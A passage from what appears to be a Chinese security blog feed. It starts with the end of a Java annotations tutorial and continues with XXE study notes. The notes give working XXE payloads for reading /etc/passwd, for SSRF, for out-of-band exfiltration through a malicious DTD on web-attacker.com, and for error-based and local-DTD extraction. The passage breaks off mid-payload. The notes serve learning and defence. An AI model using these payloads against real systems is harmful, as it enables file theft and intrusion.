class="meta">@Target(&#123;ElementType.FIELD, ElementType.METHOD&#125;)</span>  <span class="comment">// 使用数据表示</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Demo2 &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>@Retention</strong></p><p>定义了注解的生命周期:</p><ol><li>仅编译器：<code>RetentionPolicy.SOURCE</code></li><li>仅class文件：<code>RetentionPolicy.CLASS</code></li><li>运行期：<code>RetentionPolicy.RUNTIME</code></li></ol><p>如果<code>@Retention</code>不存在，则默认为<code>CLASS</code>，故在自定义注解时，需要写明<code>@Retention(RetentionPolicy.RUNTIME)</code>。</p><p>还有一些其他属性，可查阅相关文档，不再赘述。</p><p><strong>注解参数</strong></p><p>在定义注解的时候可以定义一些参数，并且能够赋予默认的值，具体如下，原理类似于接口的定义，定义无方法体的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Report &#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">type</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line">    <span class="function">String <span class="title">level</span><span class="params">()</span> <span class="keyword">default</span> &quot;info&quot;</span>;</span><br><span class="line">    <span class="function">String <span class="title">value</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03-处理注解"><a href="#0x03-处理注解" class="headerlink" title="0x03 处理注解"></a>0x03 处理注解</h1><p>注解对java代码的运行逻辑没有任何影响，我们编写的<code>RUNTIME</code>类型的注解才会在代码运行时产生影响。</p><p>所有的注解都继承于<code>java.lang.annotation.Annotation</code>，读取注解需要使用反射API。</p><p>判断是否存在注解的API：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class.isAnnotationPresent(Class) <span class="comment">//是否类定义了注解</span></span><br><span class="line">Field.isAnnotationPresent(Class) <span class="comment">// 是否字段定义了注解</span></span><br><span class="line">Method.isAnnotationPresent(Class)   <span class="comment">// 是否方法定义了注解</span></span><br><span class="line">Constructor.isAnnotationPresent(Class)  <span class="comment">// 是否构造方法定义了注解</span></span><br></pre></td></tr></table></figure><p>例如，创建构造函数的注解</p><p>注解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itranswarp.learnjava;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Target(ElementType.CONSTRUCTOR)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Construct_Annotation &#123;</span><br><span class="line">    <span class="function">String <span class="title">descp</span><span class="params">()</span> <span class="keyword">default</span> &quot;no description&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注解使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo4</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Construct_Annotation</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Demo4</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@MethodAnnotation</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello method&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Demo4 demo4 = <span class="keyword">new</span> Demo4();</span><br><span class="line">        Constructor[] constructors = demo4.getClass().getConstructors();</span><br><span class="line">        <span class="keyword">for</span> (Constructor con: constructors)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (con.isAnnotationPresent(Construct_Annotation.class))&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;构造函数注解找到&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注解的验证</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">check</span><span class="params">(Person person)</span> <span class="keyword">throws</span> IllegalArgumentException, ReflectiveOperationException </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (Field field : person.getClass().getFields()) &#123;</span><br><span class="line">            Range range = field.getAnnotation(Range.class);</span><br><span class="line">            <span class="keyword">if</span> (range != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Object value = field.get(person);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (value <span class="keyword">instanceof</span> String)&#123;</span><br><span class="line">                    <span class="keyword">int</span> value_length = ((String) value).length();</span><br><span class="line">                    System.out.println(<span class="string">&quot;当前filed：&quot;</span>+ field.getName()+ <span class="string">&quot;的长度是&quot;</span>+ ((String) value).length());</span><br><span class="line">                    <span class="keyword">if</span> (value_length &lt; range.min() || value_length &gt; range.max())&#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Invalid field: &quot;</span> + field.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (value <span class="keyword">instanceof</span> Integer)&#123;</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="keyword">int</span>) value &lt; range.min() || (<span class="keyword">int</span>) value &gt; range.min())&#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Invalid field: &quot;</span> + field.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>注解定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.FIELD)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Range &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">()</span> <span class="keyword">default</span> 255</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Range(min = 1, max = 20)</span></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Range(max = 10)</span></span><br><span class="line">    <span class="keyword">public</span> String city;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Range(min = 1, max = 100)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, String city, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.city = city;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;&#123;Person: name=%s, city=%s, age=%d&#125;&quot;</span>, name, city, age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><ol><li><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1255945389098144">https://www.liaoxuefeng.com/wiki/1252599548343744/1255945389098144</a></li><li><a href="https://blog.csdn.net/pan_junbiao/article/details/85249614">https://blog.csdn.net/pan_junbiao/article/details/85249614</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-什么是注解&quot;&gt;&lt;a href=&quot;#0x01-什么是注解&quot; class=&quot;headerlink&quot; title=&quot;0x01 什么是注解&quot;&gt;&lt;/a&gt;0x01 什么是注解&lt;/h1&gt;&lt;p&gt;注解是在java中类、方法、参数前面的一种特殊的注释。&lt;/p&gt;
&lt;figur</summary>
      
    
    
    
    <category term="WebSec" scheme="http://blog.le31ei.top/categories/WebSec/"/>
    
    
    <category term="java安全" scheme="http://blog.le31ei.top/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>xxe学习笔记</title>
    <link href="http://blog.le31ei.top/2021/03/09/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://blog.le31ei.top/2021/03/09/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-03-09T04:22:06.000Z</published>
    <updated>2021-03-10T12:22:33.912Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-DTD基础知识"><a href="#0x01-DTD基础知识" class="headerlink" title="0x01 DTD基础知识"></a>0x01 DTD基础知识</h1><p><code>DTD</code>全称document type definition，对xml的格式进行规范。DTD可以声明于xml文档中，也可以作为一个外部引用。</p><p><strong>内部DTD声明</strong>：</p><p>基本语法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root-element</span> [element-declarations]&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [                          // 定义了note类型的文档，也就是根元素为note</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span>    // 定义了note有四个元素</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>                   // 定义to元素的类型</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>                 // 定义from元素的类型</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>              //定义heading元素的类型</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>                 //定义body元素的类型</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>外部DTD声明</strong></p><p>基本语法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root-element</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;filename&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>note.dtd文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p><strong>PCDATA</strong></p><p>被解析的字符数据，表示该元素的类型是字符串类型，但是特殊字符会被实体化编码，例如：<code>&amp;</code>、<code>&lt;</code>、<code>&gt;</code>会被替换为<code>&amp;amp;</code>、<code>&amp;lt</code>、<code>&amp;gt</code>、。</p><p><strong>CDATA</strong></p><p>不会被解释器解析的文本，所有的标签会原封不动的展示出来。</p><p><strong>DTD实体</strong></p><p>内部实体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</span><br><span class="line">&lt;!ENTITY writer &quot;Donald Duck.&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;引用实体</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure><p>外部实体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http:&#x2F;&#x2F;xxx.com&#x2F;entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;xxx&#x2F;entities.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;引用实体</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure><p><strong>通用实体与参数实体</strong></p><p>通用实体指的是直接引用的实体，用&amp;开头命名，参数实体指的是在DTD中定义的其他通用实体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;&#x2F;firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;&#x2F;lastname&gt;  &#x2F;&#x2F; 通用实体，直接使用&amp;进行引用</span><br><span class="line">    ... </span><br><span class="line">&lt;&#x2F;updateProfile&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;xxx.com&#x2F;remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;    &#x2F;&#x2F;参数实体，引用参数来定义通用实体</span><br></pre></td></tr></table></figure><h1 id="0x02-XXE利用方式"><a href="#0x02-XXE利用方式" class="headerlink" title="0x02 XXE利用方式"></a>0x02 XXE利用方式</h1><h2 id="1-读文件"><a href="#1-读文件" class="headerlink" title="1. 读文件"></a>1. 读文件</h2><p>一般有回显的情况下可以直接读取文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">productId</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">productId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-ssrf"><a href="#2-ssrf" class="headerlink" title="2. ssrf"></a>2. ssrf</h2><p>无回显的时候，可以通过错误的返回来进行ssrf攻击</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://internal.vulnerable-website.com/&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>各种语言支持的协议如下图：</p><p><img src="/2021/03/09/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20181120002647-e93bbf00-ec17-1.png" alt="img"></p><h2 id="3-oob"><a href="#3-oob" class="headerlink" title="3. oob"></a>3. oob</h2><p><strong>数据带外</strong></p><p>外部加载的DTD文件，作用是让程序读取/etc/passwd然后发送到外部服务器，引号中的%需要编码成<code>&amp;#x25</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;web-attacker.com&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate; </span><br></pre></td></tr></table></figure><p>将以上文件放到受控的服务器：<code>http://web-attacker.com/malicious.dtd</code></p><p>然后对目标发送如下payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM</span><br><span class="line">&quot;http:&#x2F;&#x2F;web-attacker.com&#x2F;malicious.dtd&quot;&gt; %xxe;]&gt;</span><br></pre></td></tr></table></figure><p>对于很多文件中存在换行符的情况，以上则无法进行处理。</p><p>针对php可以采用伪协议进行base64编码发送</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;web-attacker.com&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate; </span><br></pre></td></tr></table></figure><p><strong>如果碰到数据带不出来，但有报错的情况，可以使用如下payload，读取不存在的文件，通过报错来回显数据</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure><p><strong>如果防火墙对加载外部dtd有防护的话，则可以采用<a href="https://portswigger.net/web-security/xxe/blind">https://portswigger.net/web-security/xxe/blind</a>这里所写的办法</strong></p><p>加载一个本地的dtd文件，然后覆盖文件内的节点，通过报错来直接回显数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;app&#x2F;schema.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % custom_entity &#39;</span><br><span class="line">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">&amp;#x25;eval;</span><br><span class="line">&amp;#x25;error;</span><br><span class="line">&#39;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>里面的<code>custom_entity</code>实体需要包含在<code>schema.dtd</code>中</p><p>针对不同的系统，可以有如下已经存在的dtd文件:</p><p><strong>linux gnome桌面</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ISOamsa &#39;Your DTD code&#39;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure><p><strong>windows</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:\Windows\System32\wbem\xml\cim20.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % SuperClass &#39;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#39;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure><p><strong>Cisco WebEx</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;xml&#x2F;scrollkeeper&#x2F;dtds&#x2F;scrollkeeper-omf.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % url.attribute.set &#39;&gt;Your DTD code&lt;!ENTITY 